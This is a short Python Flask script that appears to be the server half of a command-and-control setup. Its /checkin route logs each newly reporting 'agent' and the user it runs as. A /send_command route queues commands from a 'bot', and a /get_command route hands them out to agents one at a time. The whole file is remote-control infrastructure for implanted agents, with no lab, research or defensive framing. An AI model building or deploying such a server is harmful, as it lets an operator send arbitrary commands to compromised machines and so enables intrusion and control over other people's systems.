from flask import Flask, request, jsonify

app = Flask(__name__)
command_queue = []

# Beacon route: Reports when an agent runs
@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.json
    print(f"!!! NEW AGENT FOUND: {data.get('user')} !!!")
    return jsonify({"status": "acknowledged"}), 200

# Command route: Bot sends commands here
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    command_queue.append(data['command'])
    return jsonify({"status": "command_received"}), 200

# Agent route: Agent fetches commands here
@app.route('/get_command', methods=['GET'])
def get_command():
    if command_queue:
        return jsonify({"command": command_queue.pop(0)}), 200
    return jsonify({"command": "none"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
